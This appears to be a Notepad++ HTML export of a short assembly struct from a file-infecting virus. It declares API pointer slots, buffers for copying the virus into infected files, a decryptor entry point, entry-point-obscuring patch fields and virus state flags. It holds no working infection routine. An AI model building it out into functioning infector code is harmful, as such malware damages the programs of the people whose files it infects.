<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc5 {
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">vars</span><span class="sc0"> </span><span class="sc9">struct</span><span class="sc0">
    </span><span class="sc5">aLoadLibrary</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 0</span><span class="sc0">
    </span><span class="sc5">aCloseHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 4</span><span class="sc0">
    </span><span class="sc5">aGetCurrentDirectory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 8 </span><span class="sc0">
    </span><span class="sc5">aMultiByteToWideChar</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 12</span><span class="sc0">
    </span><span class="sc5">aFindFirstFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 16  </span><span class="sc0">
    </span><span class="sc5">aFindNextFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 20</span><span class="sc0">
    </span><span class="sc5">aFindClose</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 24</span><span class="sc0">
    </span><span class="sc5">aCreateFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 28</span><span class="sc0">
    </span><span class="sc5">aCreateFileMapping</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 32</span><span class="sc0">
    </span><span class="sc5">aMapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 36</span><span class="sc0">
    </span><span class="sc5">aUnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 40</span><span class="sc0">
    </span><span class="sc5">aExitProcess</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 44</span><span class="sc0">
    </span><span class="sc5">aGetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 48</span><span class="sc0">
    </span><span class="sc5">aOutputDebugString</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 52</span><span class="sc0">
    </span><span class="sc5">aSfcIsFileProtected</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; 56</span><span class="sc0">
    </span><span class="sc5">random_seed</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
    </span><span class="sc5">hFile</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
    </span><span class="sc5">hFileMap</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
    </span><span class="sc5">ptrMappedImage</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
    </span><span class="sc5">ptrVirusData</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
    </span><span class="sc5">ptrVirusBuffer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; buffer where new virus copy is created   </span><span class="sc0">
    </span><span class="sc5">ptrVirusBase</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; pointer to virus base address in infected file </span><span class="sc0">
    </span><span class="sc5">dwDeltaOffset</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc5">dwVirusSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; size of virus_code + virus_data (needed for infection algo)</span><span class="sc0">
    </span><span class="sc5">dwDataSize</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;  </span><span class="sc0">
    </span><span class="sc5">VirusEntryVa</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
    </span><span class="sc5">OrigVirusEntryVa</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
    </span><span class="sc5">dwRelEntryPoint</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; Ep address relative to ptrVirusBuffer </span><span class="sc0">
    </span><span class="sc5">ptr_sect_headers</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">number_of_sect</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">ptr_opt_header</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">decryptor_ep_VA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">number_of_epo_patches</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">epo_do_direct_call</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">virus_state_flags</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">vars</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span></div></body>
</html>
